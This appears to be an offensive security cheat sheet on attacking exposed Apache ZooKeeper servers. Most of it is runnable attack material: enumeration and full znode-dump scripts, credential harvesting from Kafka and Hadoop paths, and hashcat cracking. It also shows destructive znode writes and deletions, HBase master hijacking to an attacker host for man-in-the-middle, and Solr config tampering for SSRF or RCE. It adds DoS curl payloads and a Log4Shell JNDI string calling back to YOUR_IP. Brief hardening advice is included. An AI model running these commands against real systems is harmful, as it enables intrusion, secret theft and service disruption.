---
title: "Apache ZooKeeper"
date: 2026-02-24
draft: false
---

## Overview

Apache ZooKeeper is a distributed coordination service used by Hadoop, Kafka, Solr, HBase, and many other distributed systems. It stores configuration data, distributed locks, service registry information, and other coordination state in a hierarchical namespace called "znodes." When exposed without authentication, ZooKeeper is a goldmine: credentials, internal topology, cluster configuration, and secrets are frequently stored in plaintext znodes.

**Default Ports:**
| Port | Service |
|------|---------|
| 2181 | ZooKeeper client port (primary) |
| 2182 | ZooKeeper TLS client port |
| 2888 | Peer-to-peer communication |
| 3888 | Leader election |
| 8080 | AdminServer HTTP API (ZK 3.5+) |

---

## Recon and Fingerprinting

### Service Detection

```bash
nmap -sV -p 2181,2182,2888,3888,8080 TARGET_IP
nmap -sV -p 2181 --script zookeeper-info TARGET_IP
```

### Four Letter Words (4LW Commands)

ZooKeeper supports short text commands sent directly over TCP. These are often accessible without authentication:

```bash
# Check if ZooKeeper is running and responding
echo "ruok" | nc -q 1 TARGET_IP 2181

# Get statistics — version, latency, connections
echo "stat" | nc -q 1 TARGET_IP 2181

# Get version info
echo "srvr" | nc -q 1 TARGET_IP 2181

# List connected clients
echo "cons" | nc -q 1 TARGET_IP 2181

# Get environment variables (reveals Java version, classpath, ZK data dir)
echo "envi" | nc -q 1 TARGET_IP 2181

# Get configuration
echo "conf" | nc -q 1 TARGET_IP 2181

# Get leader/follower mode
echo "isro" | nc -q 1 TARGET_IP 2181

# List all watches
echo "wchs" | nc -q 1 TARGET_IP 2181

# Dump all watches per session
echo "wchp" | nc -q 1 TARGET_IP 2181

# Get watches per znode
echo "wchc" | nc -q 1 TARGET_IP 2181

# Memory map of znode data
echo "mntr" | nc -q 1 TARGET_IP 2181
```

### AdminServer HTTP API (ZK 3.5+)

```bash
# General status
curl http://TARGET_IP:8080/commands/stat

# List connections
curl http://TARGET_IP:8080/commands/connections

# Configuration
curl http://TARGET_IP:8080/commands/configuration

# Environment
curl http://TARGET_IP:8080/commands/environment

# Server stats
curl http://TARGET_IP:8080/commands/mntr
```

---

## ZooKeeper CLI — zkCli.sh

The ZooKeeper CLI (`zkCli.sh`) is the primary tool for interacting with znodes. It is bundled with every ZooKeeper installation and is also available standalone.

### Connecting

```bash
# Direct connection
zkCli.sh -server TARGET_IP:2181

# With timeout
zkCli.sh -server TARGET_IP:2181 -timeout 5000

# Without local ZK install — use Docker
docker run -it --rm zookeeper zkCli.sh -server TARGET_IP:2181
```

### Znode Enumeration

```bash
# Inside zkCli.sh shell:

# List root znodes
ls /

# Common paths to check immediately
ls /
ls /zookeeper
ls /kafka
ls /brokers
ls /controllers
ls /config
ls /admin
ls /consumers
ls /hadoop-ha
ls /hbase
ls /solr
ls /yarn-leader-election
ls /rmstore
ls /storm

# Recursive listing
ls -R /

# Get data from a znode
get /zookeeper/config
get /kafka/config/topics
get /brokers/ids/0

# Get metadata (ACLs, version, timestamps)
stat /

# Get ACLs — look for world:anyone perms
getAcl /
getAcl /kafka
getAcl /config
```

### Automated Enumeration Script

```bash
#!/bin/bash
# ZooKeeper znode dumper
TARGET="TARGET_IP:2181"

dump_znode() {
    local path="$1"
    echo "=== $path ==="
    echo "ruok" | nc -q1 ${TARGET%:*} ${TARGET#*:} > /dev/null 2>&1 || { echo "ZK unreachable"; exit 1; }

    # Use zkCli for enumeration
    zkCli.sh -server $TARGET get "$path" 2>/dev/null | grep -v "^$\|WATCHER\|WatchedEvent\|JLine"
}

# Enumerate all common paths
PATHS=(
    "/zookeeper/config"
    "/kafka/config"
    "/kafka/brokers/ids"
    "/config/topics"
    "/config/clients"
    "/config/users"
    "/admin/delete_topics"
    "/brokers/topics"
    "/consumers"
    "/controller"
    "/hadoop-ha"
    "/yarn-leader-election"
    "/hbase/master"
    "/hbase/backup-masters"
    "/storm/workerbeats"
    "/dubbo"
    "/services"
)

for path in "${PATHS[@]}"; do
    dump_znode "$path"
done
```

---

## CVE-2019-0201 — Information Disclosure

**CVSS:** 5.9 Medium
**Affected:** ZooKeeper < 3.4.14, < 3.5.5
**Type:** Sensitive information exposure via getACL
**CWE:** CWE-200

### Vulnerability Details

In vulnerable ZooKeeper versions, a user with read permission on a znode could use `getACL()` to retrieve the ACL of that znode, which could include the digest (salted SHA1 hash of username:password) used by other users. Even users without list or read permissions on specific znodes could obtain these hashes by calling getACL on znodes they could access.

The digest format is: `digest:username:SHA1(username:password)`

### Extracting and Cracking Hashes

```bash
# In zkCli.sh — get ACL which may expose digests
getAcl /

# Output example:
# 'digest,'admin:xXY9z...base64...=
# : cdrwa

# Extract the hash and crack it
# The hash is SHA1(base64(SHA1(username:password)))
# Crack with hashcat or john
echo "xXY9z...base64...=" | base64 -d | xxd

# Using hashcat with raw SHA1
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Python Script to Enumerate ACLs

```python
from kazoo.client import KazooClient
from kazoo.security import ACL, make_digest_acl, OPEN_ACL_UNSAFE

zk = KazooClient(hosts='TARGET_IP:2181')
zk.start()

def enumerate_acls(path='/'):
    try:
        acls, stat = zk.get_acls(path)
        print(f"[ACL] {path}:")
        for acl in acls:
            print(f"  {acl}")

        children = zk.get_children(path)
        for child in children:
            child_path = f"{path}/{child}" if path != '/' else f"/{child}"
            enumerate_acls(child_path)
    except Exception as e:
        print(f"[!] Error at {path}: {e}")

enumerate_acls()
zk.stop()
```

---

## CVE-2023-44981 — SASL Authentication Bypass

**CVSS:** 9.1 Critical
**Affected:** ZooKeeper < 3.9.1, < 3.8.3, < 3.7.2
**Type:** Authentication bypass via SASL Quorum Peer authentication
**CWE:** CWE-287

### Vulnerability Details

When ZooKeeper is configured to use SASL for quorum peer authentication (cluster-internal authentication), the SASL hostname is not validated. A malicious actor who can communicate on the ZooKeeper quorum port (2888) can potentially impersonate a legitimate ZooKeeper peer by manipulating the SASL principal. This allows an unauthenticated node to participate as a full ZooKeeper peer, gaining read/write access to the entire data tree.

### Testing for the Vulnerability

```bash
# Check ZooKeeper version
echo "srvr" | nc -q 1 TARGET_IP 2181 | grep -i version

# Check if SASL is configured for quorum
echo "conf" | nc -q 1 TARGET_IP 2181 | grep -i sasl

# If quorum.auth.enableSasl=true and version is vulnerable, test peer connection
# This requires access to port 2888 (quorum port)
nmap -p 2888 TARGET_IP
```

---

## Data Exfiltration from Znodes

### Common High-Value Znode Paths

| Path | Data Typically Found |
|------|---------------------|
| `/kafka/config/topics` | Kafka topic configurations |
| `/kafka/brokers/ids/0` | Broker connection info (host, port) |
| `/config/users` | User credentials/quotas |
| `/hadoop-ha/*/ActiveStandbyElectorLock` | HDFS NameNode info |
| `/hbase/hbaseid` | HBase cluster UUID |
| `/storm/nimbus` | Storm cluster info |
| `/dubbo` | Dubbo RPC service registry |
| `/services` | Consul/other service registration |
| `/yarn-leader-election` | YARN ResourceManager info |
| `/rmstore/ZKRMStateRoot` | YARN application state (may have tokens) |
| `/solr/live_nodes` | Solr cloud node list |

### Kazoo Python Client — Full Dump

```python
#!/usr/bin/env python3
"""
ZooKeeper full znode data extractor
Usage: python3 zk_dump.py TARGET_IP 2181
"""

import sys
import json
from kazoo.client import KazooClient
from kazoo.exceptions import NoAuthError, NoNodeError

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = sys.argv[2] if len(sys.argv) > 2 else "2181"

zk = KazooClient(hosts=f'{TARGET}:{PORT}', timeout=10)
zk.start()

results = {}

def dump_tree(path='/'):
    try:
        data, stat = zk.get(path)
        if data:
            try:
                decoded = data.decode('utf-8', errors='replace')
            except Exception:
                decoded = str(data)
            results[path] = {
                'data': decoded,
                'version': stat.version,
                'dataLength': stat.data_length,
                'numChildren': stat.num_children
            }
            # Flag sensitive-looking content
            lower = decoded.lower()
            if any(kw in lower for kw in ['password', 'passwd', 'secret', 'token', 'credential', 'key', 'auth']):
                print(f"[!] SENSITIVE DATA at {path}: {decoded[:200]}")

        children = zk.get_children(path)
        for child in children:
            child_path = f"{path}/{child}" if path != '/' else f"/{child}"
            dump_tree(child_path)
    except NoAuthError:
        print(f"[-] No auth: {path}")
    except NoNodeError:
        pass
    except Exception as e:
        print(f"[!] Error at {path}: {e}")

print(f"[*] Connecting to {TARGET}:{PORT}")
dump_tree('/')

with open('zk_dump.json', 'w') as f:
    json.dump(results, f, indent=2)

print(f"[+] Dumped {len(results)} znodes to zk_dump.json")
zk.stop()
```

### Credential Harvesting from Common Systems

```bash
# Kafka SCRAM credentials stored in ZooKeeper (older Kafka versions)
# Path: /config/users/<username>
zkCli.sh -server TARGET_IP:2181 <<EOF
ls /config/users
get /config/users/admin
EOF

# Storm DRPC configuration
zkCli.sh -server TARGET_IP:2181 <<EOF
get /storm/supervisors
ls /storm/workerbeats
EOF

# Hadoop NameNode tokens
zkCli.sh -server TARGET_IP:2181 <<EOF
get /hadoop-ha/hacluster/ActiveStandbyElectorLock
get /yarn-leader-election/yarn-cluster/ActiveStandbyElectorLock
EOF

# Service mesh credentials (Consul registered services)
zkCli.sh -server TARGET_IP:2181 <<EOF
ls /services
get /services/database/instances/0
EOF
```

---

## Writing to Znodes — Impact Assessment

If `world:anyone` has write permissions (or you obtain valid credentials), you can modify critical configuration:

```bash
# In zkCli.sh — check if you can write
set /test "malicious_data"

# If Kafka uses ZooKeeper for config, overwrite broker config
# This can cause denial of service or redirect traffic
set /kafka/config/topics/TOPICNAME '{"version":1,"config":{"retention.ms":"0"}}'

# Modify consumer group offsets (data loss/reprocessing)
set /consumers/GROUPNAME/offsets/TOPIC/0 "0"

# Delete critical znodes (DoS)
deleteall /kafka/controller
```

### HBase Hijacking

Writing to `/hbase/master` with a crafted value redirects HBase region servers and clients to a rogue master server. All database traffic from HBase clients is then routed through the attacker's host, enabling a full MitM on database read/write operations.

```bash
# Check current HBase master znode
zkCli.sh -server TARGET_IP:2181 get /hbase/master

# Overwrite with attacker-controlled host (requires write permission)
# This causes HBase clients to connect to YOUR_IP:16000 (default HBase master port)
zkCli.sh -server TARGET_IP:2181 <<'EOF'
set /hbase/master <YOUR_IP:16000:YOUR_IP,16000,0>
EOF

# Monitor HBase master election
zkCli.sh -server TARGET_IP:2181 get -w /hbase/master
```

### Solr Config Manipulation

ZooKeeper stores SolrCloud configuration files under `/solr/configs/`. Writing a malicious `solrconfig.xml` forces Solr to load it, enabling Remote Streaming (SSRF/LFI) or Velocity Templates (SSTI/RCE):

```bash
# Enumerate Solr configs stored in ZooKeeper
zkCli.sh -server TARGET_IP:2181 ls /solr/configs

# Download existing solrconfig.xml for modification
zkCli.sh -server TARGET_IP:2181 get /solr/configs/COLLECTION_NAME/solrconfig.xml > /tmp/solrconfig.xml

# Modify to enable RemoteStreaming (SSRF/LFI vector)
# Add inside <requestDispatcher>:
#   <requestParsers enableRemoteStreaming="true" ... />

# Upload modified config back
zkCli.sh -server TARGET_IP:2181 set /solr/configs/COLLECTION_NAME/solrconfig.xml "$(cat /tmp/modified_solrconfig.xml)"

# Trigger Solr to reload the config
curl "http://TARGET_IP:8983/solr/admin/collections?action=RELOAD&name=COLLECTION_NAME"
```

---

## CVE-2024-51504 — AdminServer RCE/DoS

**CVSS:** High
**Affected:** ZooKeeper with AdminServer enabled (port 8080), recent versions
**Type:** Unauthenticated access to AdminServer configuration endpoint — DoS / forced config reload
**CWE:** CWE-306

### Vulnerability Details

The ZooKeeper AdminServer (port 8080, available since ZK 3.5) exposes management commands via HTTP without authentication by default. The `/commands/configuration` endpoint accepts POST requests. Sending malformed JSON payloads causes a DoS condition; additionally, an attacker may force a malicious configuration reload if combined with other write access.

### PoC

```bash
# Check AdminServer availability
curl http://TARGET_IP:8080/commands/stat
curl http://TARGET_IP:8080/commands/configuration

# DoS via malformed JSON payload
curl -X POST http://TARGET_IP:8080/commands/configuration \
  -H "Content-Type: application/json" \
  -d '{"malformed": true}'

# Enumerate all available commands
curl http://TARGET_IP:8080/commands

# Dump full configuration (information disclosure)
curl http://TARGET_IP:8080/commands/configuration | python3 -m json.tool

# Attempt to trigger configuration reload
curl -X POST http://TARGET_IP:8080/commands/reconfig \
  -H "Content-Type: application/json" \
  -d '{}'
```

### Detection

```bash
# Check if AdminServer port is open
nmap -p 8080 TARGET_IP
curl -s http://TARGET_IP:8080/commands/ruok
```

### Remediation

- Disable AdminServer if not needed: `admin.enableServer=false` in `zoo.cfg`
- Bind AdminServer to localhost only: `admin.serverAddress=127.0.0.1`
- Implement network-level filtering on port 8080

---

## ZooKeeper Watches — Side-Channel Monitoring (Post-Exploitation)

### Four Letter Word Commands for Watch Enumeration

```bash
# List all active watches summary
echo "wchs" | nc -q 1 TARGET_IP 2181

# Watch-per-path: which sessions are watching which znodes
echo "wchp" | nc -q 1 TARGET_IP 2181

# Watch-per-client: which paths each client session is watching
echo "wchc" | nc -q 1 TARGET_IP 2181
```

### Side-Channel Attack via Watch Monitoring

By observing ZooKeeper watches in real time during post-exploitation, an attacker can determine which cluster nodes are consuming which configuration znodes and when. This enables targeted pivoting.

**Why this is dangerous:** Watches are event subscriptions. When a service reads a znode, it typically sets a watch to be notified of future changes. By monitoring `wchp` (watches per path) over time, an attacker can observe:

- A sudden spike in watches on `/config/users` after a password rotation → reveals which service is actively updating credentials
- Watches appearing on `/kafka/brokers/ids/0` → identifies which applications depend on that specific Kafka broker
- Watches on `/hbase/master` → identifies HBase clients that will be affected by hijacking the master znode

```bash
# Continuous watch monitoring (post-exploitation side channel)
while true; do
  echo "=== $(date) ==="
  echo "wchp" | nc -q 1 TARGET_IP 2181 | head -40
  sleep 10
done

# Using kazoo to monitor watch events
python3 << 'EOF'
from kazoo.client import KazooClient
import time

zk = KazooClient(hosts='TARGET_IP:2181')
zk.start()

# Watch /config/users for changes
@zk.DataWatch('/config/users')
def watch_node(data, stat, event):
    if event:
        print(f"[!] /config/users changed: event={event.type}, session={event.path}")

print("[*] Monitoring /config/users — press Ctrl+C to stop")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass

zk.stop()
EOF
```

**Post-exploitation use case:** If you have compromised one cluster node and need to pivot to a service updating credentials, monitor `wchp` to identify its ZooKeeper session ID, then correlate the source IP from `cons` output to find the service's network address.

---

## Log4Shell (CVE-2021-44228) in ZooKeeper Environments

Many legacy ZooKeeper instances in Hadoop/BigData stacks were never properly patched for Log4j. ZooKeeper used Log4j 1.x historically (not directly vulnerable to CVE-2021-44228), but instances that upgraded to Log4j 2.x without applying security patches remain susceptible.

### Determining Log4j Version

```bash
# Check Log4j version in ZooKeeper lib directory (if you have shell access)
ls /opt/zookeeper/lib/ | grep log4j
find /opt/zookeeper -name "log4j*.jar" -exec ls -la {} \;

# Check via 4LW commands for version string
echo "envi" | nc -q 1 TARGET_IP 2181 | grep -i "classpath\|log4j"
```

### JNDI Injection Testing

When ZooKeeper is configured with `zookeeper.log.level=DEBUG` or similar verbose logging, client connection strings and data written to znodes may be logged. Injecting JNDI strings into these logged values can trigger Log4Shell on a vulnerable instance.

```bash
# Test JNDI injection via ZooKeeper client connection string
# (the hostname/path is logged by some ZK versions)
zkCli.sh -server "TARGET_IP:2181" <<'EOF'
create /jndi-test "${jndi:ldap://YOUR_IP:1389/a}"
get /jndi-test
EOF

# Test via 4LW commands that log input
echo "dump" | nc -q 1 TARGET_IP 2181
# Some ZK versions log the source of 4LW commands

# Listen for callbacks on your host
# Set up a simple JNDI listener:
# java -jar JNDIExploit.jar -i YOUR_IP -p 1389
```

### Detection

```bash
# Check if ZooKeeper logging is at DEBUG level (increases attack surface)
echo "conf" | nc -q 1 TARGET_IP 2181 | grep -i "log\|debug"

# Check for Log4j 2.x in use
echo "envi" | nc -q 1 TARGET_IP 2181 | grep -i "log4j"
```

Note: ZooKeeper 3.5+ with Log4j 2.15.0+ is patched. ZooKeeper 3.4.x used Log4j 1.x (vulnerable to different CVEs but not Log4Shell directly). Validate the exact Log4j version in use before concluding exploitability.

---

## Nmap Scripts

```bash
# ZooKeeper info script
nmap -p 2181 --script zookeeper-info TARGET_IP

# Manual 4LW via nmap
nmap -p 2181 --script banner TARGET_IP

# Service version detection
nmap -sV -p 2181,2888,3888 TARGET_IP
```

---

## Tools Summary

| Tool | Usage |
|------|-------|
| `zkCli.sh` | Official ZooKeeper CLI for znode enumeration |
| `kazoo` (Python) | Python client library for scripted access |
| `nc` / `telnet` | Send 4LW commands directly |
| `nmap` | Service detection, `zookeeper-info` script |
| `zookeeper-audit` | Third-party security auditing tool |
| `docker run zookeeper zkCli.sh` | Portable ZK client |

---

## Hardening Recommendations

- Enable ZooKeeper authentication (SASL/Kerberos or digest-md5)
- Set restrictive ACLs on all znodes — avoid `world:anyone` permissions
- Restrict 4LW commands via `4lw.commands.whitelist` configuration
- Upgrade to ZooKeeper 3.9.1+ to patch CVE-2023-44981
- Firewall ZooKeeper ports (2181, 2888, 3888) — allow only application servers
- Enable TLS for ZooKeeper client connections (port 2182)
- Disable AdminServer HTTP if not needed
- Use separate credentials per application connecting to ZooKeeper
- Audit znodes regularly for stored plaintext secrets


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.